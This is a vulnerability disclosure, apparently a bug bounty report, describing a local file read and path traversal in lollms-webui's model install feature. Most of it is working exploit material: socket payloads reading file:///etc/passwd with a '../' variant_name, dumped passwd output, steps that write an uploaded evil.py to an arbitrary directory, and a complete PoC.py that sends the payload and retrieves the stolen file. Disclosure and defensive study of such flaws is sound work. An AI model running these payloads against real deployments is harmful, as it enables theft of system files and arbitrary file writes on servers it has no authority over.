# Local File Read (LFI) when installing model in UI via install_model()

# Description

in `http://localhost:9600/settings/` `Model Zoo` -> `Download from web:`, User can download model using any user specified URL via `install_model -> download_model()'s` `request.urlretrieve(*url*, model_full_path, *reporthook*=report_progress)` . Including `file://` protocol and etc. resulting arbitrary read. 



## Proof of Concept

### `/home/retr0/Downloads/lollms-webui/lollms_core/lollms/binding.py`

```python
    def install_model(self, model_type:str, model_path:str, variant_name:str, client_id:int=None):
        print("Install model triggered")
        sanitize_path(model_path)
        model_path = model_path.replace("\\","/")
        parts = model_path.split("/")
        if parts[2]=="huggingface.co":
            ASCIIColors.cyan("Hugging face model detected")
            model_name = parts[4]
        else:
            model_name = variant_name

        if model_type.lower() in model_path.lower():
            model_type:str=model_type
        else:
            mtt = None
            for mt in self.models_dir_names:
                if mt.lower() in  model_path.lower():
                    mtt = mt
                    break
            if mtt:
                model_type = mtt
            else:
                model_type:str=self.models_dir_names[0]

        progress = 0
        installation_dir = self.searchModelParentFolder(model_path.split('/')[-1], model_type)
        if model_type=="gptq" or  model_type=="awq" or model_type=="transformers":
            parts = model_path.split("/")
            if len(parts)==2:
                filename = parts[1]
            else:
                filename = parts[4]
            installation_path = installation_dir / filename

        elif model_type=="gpt4all":
            filename = variant_name
            model_path = "http://gpt4all.io/models/gguf/"+filename
            installation_root_dir = installation_dir / model_name 
            installation_root_dir.mkdir(parents=True, exist_ok=True)
            installation_path = installation_root_dir / filename
        else:
            filename = Path(model_path).name
            installation_root_dir = installation_dir / model_name 
            installation_root_dir.mkdir(parents=True, exist_ok=True)
            installation_path = installation_root_dir / filename
        print("Model install requested")
        print(f"Model path : {model_path}")
        print(f"Installation Path : {installation_path}")

        binding_folder = self.config["binding_name"]
        model_url = model_path
        signature = f"{model_name}_{binding_folder}_{model_url}"
        try:
            self.download_infos[signature]={
                "start_time":datetime.now(),
                "total_size":self.get_file_size(model_path),
                "downloaded_size":0,
                "progress":0,
                "speed":0,
                "cancel":False
            }
            
# Codes......    
                
                if self.download_infos[signature]["cancel"]:
                    raise Exception("canceled")
                     
            try:
                self.download_model(model_path, model_name, callback)
                ### ^ SINK ^
```

```python
def download_model(self, url, model_name, callback = None):
        folder_path = self.searchModelFolder(model_name)
        model_full_path = (folder_path/model_name)/str(url).split("/")[-1]
        # Check if file already exists in folder
        if model_full_path.exists():
            print("File already exists in folder")
        else:
            # Create folder if it doesn't exist
            folder_path.mkdir(parents=True, exist_ok=True)
            if not callback:
                progress_bar = tqdm(total=100, unit="%", unit_scale=True, desc=f"Downloading {url.split('/')[-1]}")
            # Define callback function for urlretrieve
            downloaded_size = [0]
            def report_progress(block_num, block_size, total_size):
                if callback:
                    downloaded_size[0] += block_size
                    callback(downloaded_size[0], total_size)
                else:
                    progress_bar.update(block_size/total_size)
            # Download file from URL to folder
            try:
                Path(model_full_path).parent.mkdir(parents=True, exist_ok=True)
                request.urlretrieve(url, model_full_path, reporthook=report_progress)
                # ^^^^^^^^^ NO CHECK ^^^^^^^^^ 
                print("File downloaded successfully!")
            except Exception as e:
                ASCIIColors.error("Error downloading file:", e)
                
```

Additionally, `variant_name` to `specifc` a name for download, however, also vulnerable to travaling

## Exploiting

#### Arbitrary read

1. Start the server
2. Use `http://localhost:9600/settings/` -> `Model Zoo` -> `Download from web:`
3. Download `file://<ANY_FILE>` 
4. Intercept `post` (via `burpsuite` or any), edit `["install_model",{"path":"file://123","type":"api"}]`

```
["install_model",{"model_name":"retr0reg", "path":"file:///etc/passwd","type":"api", "variant_name":"<PATH_TRAVSAL_ALSO_CAN_BE_ANY>"}]
```

​	For example, I will use

```
["install_model",{"model_name":"retr0reg", "path":"file:///etc/passwd","type":"api", "variant_name":"../../uploads"}]
```

5. Download the `passwd`file saved in `/uploads` via `curl or any`

   ```
    ▲ Downloads/personal_data/uploads curl -X 'GET' \
     'http://localhost:9600/uploads/passwd' \
     -H 'accept: application/json'
     
   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   bin:x:2:2:bin:/bin:/usr/sbin/nologin
   sys:x:3:3:sys:/dev:/usr/sbin/nologin
   sync:x:4:65534:sync:/bin:/bin/sync
   games:x:5:60:games:/usr/games:/usr/sbin/nologin
   man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
   lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
   mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
   news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
   uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
   proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
   www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
   backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
   list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
   irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
   gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
   nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
   systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
   systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
   messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
   systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
   syslog:x:104:111::/home/syslog:/usr/sbin/nologin
   _apt:x:105:65534::/nonexistent:/usr/sbin/nologin
   uuidd:x:106:112::/run/uuidd:/usr/sbin/nologin
   tcpdump:x:107:113::/nonexistent:/usr/sbin/nologin
   retr0:x:1000:1000:,,,:/home/retr0:/usr/bin/zsh
   mysql:x:108:117:MySQL Server,,,:/var/lib/mysql:/bin/false
   dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
   sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
   ```

   #### Arbitrary upload

   Since we can control `variant_name` wen can also write to Arbitrary locations by point `path` to our upload file, `variant_name` To write location.

   1. Start the server

   2. Use `http://localhost:9600/` -> `send file to ai` to upload the file you wanted to write (The upload file will be in `uploads/`)  

   3. To known the location of your update: the Path to `uploads` will pop up on the right side of the chat when you fetching a webpage in discussion, the `uploaded file` will be in the `personal_data/discussion_databases/{current databse name}/{discussion index}/text_data/` (index can be checked by `burpsuite` when visiting a discussion)

   4. Use `http://localhost:9600/settings/` -> `Model Zoo` -> `Download from web:`

   5. Download `file://<ANY_FILE>` 

   6. Intercept `post` (via `burpsuite` or any), edit `["install_model",{"path":"file://123","type":"api"}]`

       Now `"path"` will be the ` file ` + path to your uploaded file path. `variant_name` will be targeted lots of `../` + directory

      Example:

      ```
      ["install_model",{"model_name":"retr0reg", "path":"file:///home/retr0/Downloads/personal_data/discussion_databases/default/5/text_data/evil.py","type":"api", "variant_name":"../../../../../../../../../../../../home/retr0/PoC/LFI-lolllms/good-py-service"}]
      ```

      then, the targeted `evil.py` will be inside of `/home/retr0/PoC/LFI-lolllms/good-py-service`

## `PoC.py`

```python
import socketio
import requests
import argparse
import zer0poc as zp

TARGET = "http://localhost:9600"

def parse_args():
    # get path travalTo
    parser = argparse.ArgumentParser(description="Exploit for the https://huntr.com/bounties/cd383817-924a-445a-838e-d0c867c6a176/\n")
    parser.add_argument("--path", type=str, default="/etc/passwd", help="Targeted file abosulte path")
    # parser.add_argument("--base", type=str, default="uploads", help="downloaded base (For example: uploads)")
    return parser.parse_args()

def exploit(
        model_name: str = "retr0reg",
        path: str = "/etc/passwd",
        travalTo = "uploads",
    ):

    global TARGET
    io = socketio.Client()
    io.connect(TARGET)

    print(f"[+] Exploiting {TARGET} with path {path} and travalTo {travalTo}")

    
    payload = {
                "model_name":model_name, 
                "path":f"file://{path}",
                "type":"api", 
                "variant_name":"../../uploads"
                }
    
    print(f"    [-] Sending payload: {payload}")

    io.emit('install_model', payload)

    print("    [-] exploit done!\n")
    return path, travalTo

def download_file(
        base: str = "uploads",
        file_name: str = "passwd",
    ):

    global TARGET

    print(f"[+] Downloading file {file_name} from {TARGET}/{base}/{file_name}")
    return requests.get(f"{TARGET}/{base}/{file_name}").text

def main():
    args = parse_args()
    target_path, target_base = exploit(path=args.path)

    target_filename = target_path.split("/")[-1]

    result = download_file(target_base, target_filename)
    print(f"[+] File {target_base}/{target_filename} Download!\n\n")
    print(result)

main()
```

